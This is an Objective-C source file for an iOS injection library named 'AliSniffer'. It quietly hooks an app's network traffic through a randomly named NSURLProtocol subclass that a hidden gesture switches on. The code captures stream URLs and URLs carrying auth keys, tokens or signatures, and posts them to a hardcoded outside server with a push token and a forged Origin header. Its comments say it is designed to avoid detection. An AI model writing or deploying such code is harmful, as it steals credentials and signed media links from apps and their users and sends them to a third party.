// AliSniffer.m — Stealth(隐身) 版
// 关键策略：默认不注册/不Hook；三指三击手势启用；动态生成随机 NSURLProtocol 子类；仅观察 http/https；抓到后上报+弹窗+复制；白名单域 + 去重；
// 需要：-framework UIKit -framework Foundation

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>

// ===== 配置 =====
static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/push_raw", @"/push"]; }

// 默认弹窗开关
static const BOOL kPopupOnAuth  = YES;
static const BOOL kPopupOnPlain = YES;

// URL 去重时间
static const NSTimeInterval kDedupeWindow = 60.0;
// 自动撤销注册的时间窗口（启用后 N 秒自动撤销，减少暴露）
static const NSTimeInterval kAutoDisableAfter = 30.0;

// 只观察这些域名（尽量缩小面）
static NSArray<NSString*> *TargetHosts(void) {
    return @[@"kuniunet.com", @"jiayinkeji.xin"]; // 可自行追加
}

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[AliStealth] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

// ===== 运行态 =====
static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;
static BOOL g_enabled = NO;                // 当前是否启用捕获
static Class g_dynProtoCls = Nil;          // 动态生成的 NSURLProtocol 子类
static UIGestureRecognizer *g_tripleTap;   // 三指三击手势
static dispatch_source_t g_autoTimer;

// ===== 公用工具 =====
static inline void on_main(void(^blk)(void)){
    if (!blk) return;
    if ([NSThread isMainThread]) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}
static void popup(NSString *title, NSString *msg, NSString *copyText){
    if (!msg) return;
    on_main(^{
        @try{
            UIWindow *win = nil;
            if (@available(iOS 13.0,*)) {
                for (UIWindowScene *sc in UIApplication.sharedApplication.connectedScenes){
                    if (sc.activationState==UISceneActivationStateForegroundActive){
                        for (UIWindow *w in sc.windows) if (w.isKeyWindow) { win = w; break; }
                        if (win) break;
                    }
                }
            }
            if (!win) win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
            UIViewController *vc = win.rootViewController;
            while (vc.presentedViewController) vc = vc.presentedViewController;

            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title
                                                                        message:msg
                                                                 preferredStyle:UIAlertControllerStyleAlert];
            if (copyText.length){
                [ac addAction:[UIAlertAction actionWithTitle:@"复制URL" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                    UIPasteboard.generalPasteboard.string = copyText;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        }@catch(__unused NSException *e){}
    });
}
static BOOL hasAuthLike(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    return [s containsString:@"auth_key="] ||
           [s containsString:@"txsecret="] ||
           [s containsString:@"txkey="]    ||
           [s containsString:@"sign="]     ||
           [s containsString:@"token="];
}
static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"] || [s containsString:@".flv"] || [s containsString:@".mp4"] ||
        [s containsString:@".ts"]   || [s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@".php"] || [s containsString:@"phonelive"] ||
        [s containsString:@"replay"] || [s containsString:@"pull."] ||
        [s containsString:@"live"]) return YES;
    if (hasAuthLike(u)) return YES;
    return NO;
}
static BOOL hostInWhitelist(NSURL *url){
    if (!url.host) return NO;
    NSString *h = url.host.lowercaseString;
    for (NSString *t in TargetHosts()){
        if ([h containsString:t]) return YES;
    }
    return NO;
}
static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u];
        NSDate *now  = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}
static void postText(NSString *text){
    if (!text) return;
    __block NSInteger idx = 0;
    NSArray *paths = kPushPaths();
    __block void (^tryNext)(void) = ^{
        if (idx >= (NSInteger)paths.count) return;
        NSString *url = [kPushHost stringByAppendingString:paths[idx++]];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
        req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];

        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
            if (e || sc<200 || sc>=300) tryNext();
        }] resume];
    }; tryNext();
}
static void handleURL(NSString *u, NSString *from){
    if (!u || !looksLikeStream(u)) return;
    if (dedupe_skip(u)) return;
    BOOL auth = hasAuthLike(u);
    NSString *title = auth ? @"抓到 URL（auth_key 优先）" : @"抓到 URL";
    NSString *msg   = from ? [NSString stringWithFormat:@"%@\n%@", from, u] : u;
    postText(u);
    if (auth){
        if (kPopupOnAuth){ popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; }
    }else{
        if (kPopupOnPlain){ popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; }
    }
}

// ===== 动态 NSURLProtocol 子类（随机名） =====
static NSString *randIdent(void){
    uint32_t r = arc4random();
    return [NSString stringWithFormat:@"SNF%08X", r];
}

static Class makeDynamicProtocolClass(void){
    NSString *name = [NSString stringWithFormat:@"%@_%@", @"SniffProto", randIdent()];
    Class super = [NSURLProtocol class];
    Class cls = objc_allocateClassPair(super, name.UTF8String, 0);
    if (!cls) return Nil;

    // canInitWithRequest:
    BOOL (^canInit)(id, NSURLRequest*) = ^BOOL(id _self, NSURLRequest *request){
        @try{
            if (!g_enabled) return NO;                      // 未启用时不拦
            if (!request) return NO;
            NSString *sch = request.URL.scheme.lowercaseString;
            if (![sch isEqualToString:@"http"] && ![sch isEqualToString:@"https"]) return NO;
            if (![request isKindOfClass:[NSMutableURLRequest class]]) {
                // 只要白名单域名
                if (!hostInWhitelist(request.URL)) return NO;
            }
            // 防循环
            if ([NSURLProtocol propertyForKey:@"snf_handled" inRequest:request]) return NO;
            return YES;
        }@catch(__unused NSException *e){ return NO; }
    };
    class_addMethod(object_getClass(cls), sel_getUid("canInitWithRequest:"), imp_implementationWithBlock(canInit), "c@:@");

    // canonicalRequestForRequest:
    NSURLRequest* (^canon)(id, NSURLRequest*) = ^NSURLRequest*(id _self, NSURLRequest *req){ return req; };
    class_addMethod(object_getClass(cls), sel_getUid("canonicalRequestForRequest:"), imp_implementationWithBlock(canon), "@@:@");

    // startLoading
    void (^start)(id) = ^(id _self){
        @try{
            NSURLRequest *req = ((NSURLRequest*(*)(id,SEL))objc_msgSend)(_self, sel_getUid("request"));
            if (req.URL.absoluteString.length) dispatch_async(gq, ^{ handleURL(req.URL.absoluteString, @"Stealth/NSURLProtocol"); });

            NSMutableURLRequest *m = [req mutableCopy];
            [NSURLProtocol setProperty:@(YES) forKey:@"snf_handled" inRequest:m];

            NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration defaultSessionConfiguration];
            if ([cfg respondsToSelector:@selector(setProtocolClasses:)]) cfg.protocolClasses = @[];

            NSURLSession *ses = [NSURLSession sessionWithConfiguration:cfg];
            NSURLSessionDataTask *task = [ses dataTaskWithRequest:m
                                                completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err){
                id client = ((id(*)(id,SEL))objc_msgSend)(_self, sel_getUid("client"));
                if (err) {
                    @try{ ((void(*)(id,SEL,id,id))objc_msgSend)(client, sel_getUid("URLProtocol:didFailWithError:"), _self, err); }@catch(__unused NSException *e){}
                } else {
                    @try{
                        ((void(*)(id,SEL,id,id,NSUInteger))objc_msgSend)(client, sel_getUid("URLProtocol:didReceiveResponse:cacheStoragePolicy:"), _self, resp, 0);
                        if (data.length) ((void(*)(id,SEL,id,id))objc_msgSend)(client, sel_getUid("URLProtocol:didLoadData:"), _self, data);
                        ((void(*)(id,SEL,id))objc_msgSend)(client, sel_getUid("URLProtocolDidFinishLoading:"), _self);
                    }@catch(__unused NSException *e){}
                }
            }];
            ((void(*)(id,SEL,id))objc_msgSend)(_self, sel_getUid("setTask:"), task);
            [task resume];
        }@catch(__unused NSException *e){
            id client = ((id(*)(id,SEL))objc_msgSend)(_self, sel_getUid("client"));
            NSError *err = [NSError errorWithDomain:NSURLErrorDomain code:-1 userInfo:nil];
            @try{ ((void(*)(id,SEL,id,id))objc_msgSend)(client, sel_getUid("URLProtocol:didFailWithError:"), _self, err); }@catch(__unused NSException *e2){}
        }
    };
    class_addMethod(cls, sel_getUid("startLoading"), imp_implementationWithBlock(start), "v@:");

    // stopLoading（best-effort）
    void (^stop)(id) = ^(id _self){
        @try{
            NSURLSessionDataTask *t = nil;
            if ([_self respondsToSelector:@selector(task)]) t = ((id(*)(id,SEL))objc_msgSend)(_self, sel_getUid("task"));
            [t cancel];
        }@catch(__unused NSException *e){}
    };
    class_addMethod(cls, sel_getUid("stopLoading"), imp_implementationWithBlock(stop), "v@:");

    // 关联一个 task 属性（弱）
    class_addIvar(cls, "task", sizeof(id), log2(sizeof(id)), @encode(id));
    BOOL (^setTask)(id,id) = ^BOOL(id _self, id v){ object_setIvar(_self, class_getInstanceVariable(cls, "task"), v); return YES; };
    id   (^getTask)(id)    = ^id(id _self){ return object_getIvar(_self, class_getInstanceVariable(cls, "task")); };
    class_addMethod(cls, sel_getUid("setTask:"), imp_implementationWithBlock(setTask), "v@:@");
    class_addMethod(cls, sel_getUid("task"),     imp_implementationWithBlock(getTask), "@@:");

    objc_registerClassPair(cls);
    return cls;
}

// ===== 启用/停用 =====
static void enableSniffer(void){
    if (g_enabled) return;
    if (!g_dynProtoCls) g_dynProtoCls = makeDynamicProtocolClass();
    if (!g_dynProtoCls) return;

    [NSURLProtocol registerClass:g_dynProtoCls];
    g_enabled = YES;
    popup(@"AliSniffer", @"隐身模式：已启用捕获（30秒后自动关闭，或再三指三击手动关闭）", nil);

    // 自动关闭计时器
    if (g_autoTimer) { dispatch_source_cancel(g_autoTimer); g_autoTimer = nil; }
    g_autoTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dispatch_get_main_queue());
    dispatch_source_set_timer(g_autoTimer, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kAutoDisableAfter*NSEC_PER_SEC)), DISPATCH_TIME_FOREVER, (1*NSEC_PER_SEC));
    dispatch_source_set_event_handler(g_autoTimer, ^{
        if (g_enabled) {
            [NSURLProtocol unregisterClass:g_dynProtoCls];
            g_enabled = NO;
            popup(@"AliSniffer", @"隐身模式：已自动关闭", nil);
        }
        dispatch_source_cancel(g_autoTimer); g_autoTimer = nil;
    });
    dispatch_resume(g_autoTimer);
}
static void disableSniffer(void){
    if (!g_enabled) return;
    [NSURLProtocol unregisterClass:g_dynProtoCls];
    g_enabled = NO;
    if (g_autoTimer) { dispatch_source_cancel(g_autoTimer); g_autoTimer = nil; }
    popup(@"AliSniffer", @"隐身模式：已手动关闭", nil);
}
static void toggleSniffer(UIGestureRecognizer *gr){
    if (gr.state != UIGestureRecognizerStateRecognized) return;
    if (g_enabled) disableSniffer(); else enableSniffer();
}

// ===== 安装手势（3 指 3 击） =====
static void installGesture(void){
    on_main(^{
        @try{
            UIWindow *win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
            if (!win) return;
            UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:[NSBlockOperation blockOperationWithBlock:^{}] action:nil];
            // 我们自己转发
            tap.numberOfTapsRequired    = 3;
            tap.numberOfTouchesRequired = 3;
            [win addGestureRecognizer:tap];
            // 用 runtime 把 action 指到 C 函数
            class_addMethod([tap class], sel_getUid("snf_fire"), (IMP)toggleSniffer, "v@:@");
            [tap addTarget:tap action:sel_getUid("snf_fire")];
            g_tripleTap = tap;

            // 提示一次：三指三击开启/关闭
            popup(@"AliSniffer 已加载（隐身）", @"三指三击屏幕：开启/关闭捕获；默认关闭（避免被检测）。", nil);
        }@catch(__unused NSException *e){}
    });
}

// ===== 入口 =====
__attribute__((constructor))
static void AliStealthInit(void){
    @try{
        if (!gq)    gq    = dispatch_queue_create("com.alistealth.queue", DISPATCH_QUEUE_SERIAL);
        if (!g_seen) g_seen = [NSMutableDictionary dictionary];
        installGesture();   // 只装手势，不注册任何协议/Hook
    }@catch(__unused NSException *e){}
}
